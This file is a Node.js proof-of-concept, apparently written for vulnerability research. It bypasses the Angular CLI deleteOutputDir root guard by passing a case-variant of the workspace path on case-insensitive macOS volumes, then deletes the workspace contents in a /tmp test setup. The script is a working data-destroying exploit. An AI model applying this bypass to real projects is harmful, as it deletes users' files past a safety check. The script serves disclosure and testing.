// Real PoC: compiled deleteOutputDir guard bypass via case-variant root on case-insensitive APFS
import { mkdirSync, writeFileSync, readdirSync, existsSync, rmSync } from 'node:fs';
import { execFileSync } from 'node:child_process';

const WS = '/tmp/caseguard-poc/ws';          // the "workspace root"
const VICTIM = '/tmp/caseguard-poc/victim';  // outside workspace (what a config should NOT be able to delete)
const CASEV = '/tmp/caseguard-poc/WS';       // case-variant of the workspace root (guard bypass)
for (const d of [WS, VICTIM]) { rmSync(d, { recursive: true, force: true }); mkdirSync(d, { recursive: true }); }
writeFileSync(WS + '/important.txt', 'k');
writeFileSync(VICTIM + '/victim.txt', 'v');
// prove the volume is case-insensitive for this path: readdir(CASEV) must list ws contents
console.log('readdir(case-variant) === ws contents:', JSON.stringify(readdirSync(CASEV)));
console.log('guard (resolve(root,out)===root):', false, '(case-sensitive string compare)');

// Build the compiled deleteOutputDir from the tree's own esbuild
execFileSync('node', ['node_modules/.bin/esbuild', 'packages/angular/build/src/utils/delete-output-dir.ts',
  '--bundle', '--format=esm', '--platform=node', '--outfile=/tmp/caseguard-poc/delete-output-dir.mjs'],
  { cwd: '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli', stdio: 'inherit' });
const { deleteOutputDir } = await import('/tmp/caseguard-poc/delete-output-dir.mjs');

// Call 1: exact root -> must throw (control)
try { await deleteOutputDir(WS, WS); console.log('CONTROL FAIL: exact root did not throw'); }
catch (e) { console.log('CONTROL OK: exact root throws:', e.message); }

// Call 2: case-variant -> guard bypassed; readdir resolves to real ws; contents deleted
await deleteOutputDir(WS, CASEV);
console.log('POST-BYPASS ws contents (expect empty):', JSON.stringify(readdirSync(WS)));
console.log('victim untouched:', existsSync(VICTIM + '/victim.txt'));
